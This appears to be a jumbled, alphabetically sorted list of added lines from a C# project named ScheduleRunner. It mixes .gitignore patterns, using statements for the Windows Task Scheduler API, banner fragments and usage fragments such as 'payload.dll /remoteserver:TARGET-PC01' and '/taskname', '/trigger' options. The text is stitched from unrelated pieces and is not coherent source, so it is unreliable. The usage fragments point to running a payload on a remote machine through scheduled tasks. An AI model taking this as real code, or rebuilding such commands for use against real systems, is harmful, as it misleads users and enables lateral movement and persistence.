+[Aa][Rr][Mm]64/
+[Bb]in/
+[Bb]uild[Ll]og.
+[Dd]ebug/
+[Dd]ebugPS/
+[Dd]ebugPublic/
+[Ee]xpress/
+[Ll]og/
+[Ll]ogs/
+[Oo]bj/
+[Rr]elease/
+[Rr]eleasePS/
+[Rr]eleases/
+[Tt]est[Rr]esult
+[Ww][Ii][Nn]32/
+[assembly: ComVisible(false)]
+] /program 
+] /remoteserver 
+] /taskname 
+] /trigger 
+] are mandatory fields.
+_Chutzpah
+_NCrunch_
+_Pvt_Extensions
+_ReSharper
+_TeamCity
+_UpgradeReport_Files/
+__  ______  ____  ___  _____ 
+___/
+___/_/ 
+___/_/      
+___/_/ /_/
+__pycache__/
+_h.h
+_i.c
+_p.c
+_pkginfo.txt
+_wpftmp.csproj
+artifacts/
+bld/
+bower_components/
+build
+coverage
+crunch
+csx/
+dlldata.c
+ecf/
+healthchecksdb
+ipch/
+issue-259490424)
+issuecomment-104372622)
+mono_crash.
+nCrunchTemp_
+namespace ScheduleRunner
+net40
+net45
+netstandard1.0
+node_modules/
+nunit-
+orleans.codegen.cs
+packages
+paket-files/
+payload.dll /remoteserver:TARGET-PC01
+payload.dll /user:netero1010
+project.fragment.lock.json
+project.lock.json
+publish/
+rcf/
+temp
+using Microsoft.Win32
+using Microsoft.Win32.TaskScheduler
+using System
+using System.Collections.Generic
+using System.IO
+using System.Linq
+using System.Reflection
+using System.Runtime.InteropServices
+using System.Security
+using System.Security.AccessControl
+using System.Security.Principal
+wwwroot/
+x64/
+x86/
+{FF5F7C4C-6915-4C53-9DA3-B8BE6C5F1DB9}.Debug
+{FF5F7C4C-6915-4C53-9DA3-B8BE6C5F1DB9}.Release
